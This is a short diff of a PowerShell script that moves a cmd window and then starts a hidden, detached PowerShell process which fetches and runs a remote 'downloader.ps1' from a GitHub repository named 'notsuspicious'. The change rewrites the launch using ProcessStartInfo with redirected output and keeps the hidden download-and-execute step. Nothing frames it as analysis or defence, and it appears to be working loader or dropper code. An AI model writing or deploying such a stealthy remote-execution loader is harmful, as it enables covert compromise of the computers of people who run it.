@@ -16,4 +16,11 @@ $rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 200
 Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
 
 # Start the downloader.ps1 script in a hidden, detached PowerShell window
-Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-NoLogo", "-NoProfile", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content"
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-WindowStyle Hidden -NoLogo -NoProfile -Command `"Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content`""
+$psi.UseShellExecute = $false
+$psi.RedirectStandardOutput = $true
+
+$p = [System.Diagnostics.Process]::Start($psi)
+
